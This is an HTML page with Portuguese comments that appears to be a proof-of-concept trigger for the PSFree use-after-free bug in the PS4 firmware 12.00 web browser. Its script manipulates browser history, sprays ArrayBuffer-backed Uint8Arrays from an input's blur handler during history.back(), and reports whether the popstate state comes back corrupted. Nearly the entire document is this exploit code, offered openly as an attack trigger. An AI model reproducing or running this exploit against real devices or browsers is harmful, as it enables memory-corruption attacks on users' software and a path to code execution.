
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 - True PSFree Trigger</title>
    <style>
        body { background-color: #1a1a1a; color: #fff; font-family: monospace; padding: 20px; }
        button { padding: 15px; font-weight: bold; cursor: pointer; background: #e0e0e0; color: #000; }
        #log-area { background: #000; color: #0f0; padding: 15px; border: 1px solid #333; height: 350px; overflow-y: scroll; display: none; margin-top: 20px;}
        input { padding: 10px; font-size: 16px; margin-top: 20px; }
    </style>
</head>
<body>

    <h2>PS4 12.00 - True PSFree Trigger</h2>
    <p>Status: <span id="status" style="color: #ffeb3b;">Aguardando...</span></p>

    <button onclick="startPSFree()">Disparar PSFree UAF</button>
    <br>
    <input id="hacker-input" type="text" value="Foque aqui e aguarde...">

    <div id="log-area"></div>

    <script>
        const ssv_len = 0x50; // 80 bytes (Tamanho no PS4)
        const statusEl = document.getElementById('status');
        const logArea = document.getElementById('log-area');
        const input = document.getElementById('hacker-input');

        function startPSFree() {
            statusEl.innerText = "Preparando histórico...";
            
            // 1. Criamos os estados no histórico
            history.replaceState("state0", "");
            history.pushState("state1", "", location.pathname + "#foo");
            history.pushState("state2", ""); // O estado atual

            // 2. Focamos no Input
            input.focus();

            // 3. O evento de Blur que será chamado durante o history.back()
            input.onblur = function() {
                statusEl.innerText = "Blur ativado! Fazendo Spray...";
                
                // Spray com Uint8Array (Idêntico ao PSFree - Linha 236 do psfree.mjs)
                window.spray_views = [];
                for (let i = 0; i < 10000; i++) {
                    let view = new Uint8Array(new ArrayBuffer(ssv_len));
                    view[0] = 0x41; // 'A'
                    window.spray_views.push(view);
                }
            };

            // 4. Ouve o evento de PopState (Quando a página termina de voltar)
            window.onpopstate = function(event) {
                logArea.style.display = "block";
                logArea.innerHTML = "<b>[ RESULTADO DO POPSTATE ]</b><br><br>";

                if (event.state === "state1") {
                    logArea.innerHTML += "<span style='color:red;'>✗ FALHA: O estado retornou normal ('state1'). O UAF não funcionou.</span>";
                } else if (event.state === null) {
                    logArea.innerHTML += "<span style='color:orange;'>! NULO: O estado foi apagado, mas não corrompido.</span>";
                } else {
                    // SE CAIR AQUI, VOCÊ VENCEU!
                    logArea.innerHTML += "<span style='color:green;'>✓ SUCESSO ABSOLUTO! Estado Corrompido:</span><br>";
                    logArea.innerHTML += JSON.stringify(event.state);
                    statusEl.innerText = "UAF EXECUTADO COM SUCESSO!";
                }
            };

            // 5. O Gatilho: Voltar a página (Isso tira o foco do input e causa o caos)
            setTimeout(() => {
                statusEl.innerText = "Voltando no histórico...";
                history.back();
            }, 500);
        }
    </script>
</body>
</html>
